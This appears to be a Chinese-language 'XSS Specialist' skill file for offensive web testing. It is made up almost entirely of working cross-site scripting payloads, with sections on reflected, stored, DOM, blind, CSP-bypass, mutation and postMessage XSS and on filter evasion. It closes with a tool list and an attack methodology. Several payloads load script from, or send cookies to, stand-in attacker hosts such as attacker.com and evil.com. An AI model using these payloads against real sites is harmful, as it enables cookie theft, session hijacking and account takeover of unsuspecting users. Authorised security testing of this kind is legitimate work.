# XSS Specialist

## 核心能力

Reflected/Stored/DOM/mXSS/Self-XSS升级 — 含CSP绕过、PostMessage利用、Shadow DOM穿透。

## XSS 分类和Payload

### Reflected XSS
```
# 基础探测
"><h1>XSS_TEST</h1>
';alert(1)//
<script>alert(document.domain)</script>

# 属性逃逸
" autofocus onfocus=alert(1) x="
" onclick="alert(1)" x="
javascript:alert(1)

# 常见注入上下文
<input value="PAYLOAD">   →  "><script>alert(1)</script>
<a href="PAYLOAD">       →  javascript:alert(1)
<img src="x" onerror=alert(1)>
```

### Stored XSS
```
# 评论/消息/用户名
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

# 绕过strip_tags
<scr<script>ipt>alert(1)</scr</script>ipt>
<sCrIpT>alert(1)</sCrIpT>
<img src=x onerror="&#97;lert(1)">
```

### DOM XSS
```
# 危险sink
eval(payload)
document.write(payload)
innerHTML = payload
location.href = payload
jQuery.html(payload) / jQuery(payload)

# Source → Sink 追踪
window.location.hash / search
document.referrer
postMessage data
localStorage
```

### Blind XSS
```
# 后台/管理员面板
"><script src=//attacker.com/xss></script>
"><img src=x id=xss onerror=eval(atob(this.id))>

# XSS Hunter payload
<script src=https://yoursubdomain.xss.ht></script>
```

### CSP Bypass
```
# 被禁: script-src 'self'
<link rel=prefetch href="//attacker.com?cookie">
<base href="//attacker.com/">

# JSONP 回调
<script src="/api/jsonp?callback=alert(1)"></script>

# script-src 'unsafe-inline' + nonce绕过
<script nonce= leak>

# CSP 缺失 → 经典XSS
<script src="https://evil.com/steal.js"></script>
```

### mXSS (Mutation XSS)
```
# innerHTML变异
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">

# DOMPurify绕过历史
<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>
```

### PostMessage XSS
```
# 无origin验证
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data;
});

# 利用
<iframe src="//victim.com">
<script>
  frames[0].postMessage('<img src=x onerror=alert(1)>', '*');
</script>
</iframe>
```

## WAF/Filter Bypass

### HTML上下文
```
<svg/onload=alert(1)>           # 无空格
<img src=x onerror=alert(1)     # 无引号
<a href="javascript&#58;alert(1)">  # HTML编码
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

### 事件handler大全
```
onerror, onload, onclick, onmouseover, onfocus, onfocusin
ontoggle, onanimationstart, onanimationend, ontransitionend
onpointerenter, ontouchend, onpaste
```

## Payload 短名单
```
123<script>alert(1)</script>abc
"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
'-alert(1)-'
"+alert(1)+"
<iframe srcdoc="<script>alert(1)</script>">
```

## 工具链
- XSStrike: 自动化扫描+Fuzzing
- dalfox: Go写的快速XSS扫描器
- knoxss.com: 在线WAF绕过测试
- Burp DOM Invader: DOM XSS探测
- XSS Hunter / Blind XSS: 盲XSS回调

## 知识库
- `@communitytools/skills/client-side` — XSS/CSRF/CORS/Clickjacking
- `@communitytools/skills/injection` — HTML/SVG injection

## 方法论
1. 确认注入上下文：HTML标签内 / 属性内 / script标签内 / 事件handler内
2. 构造逃逸payload → 先逃出当前上下文再注入script
3. 检查响应头有无CSP → 有则走CSP绕过路径
4. 存储型→查blind XSS节点
5. 自测完后换XSStrike扔一遍
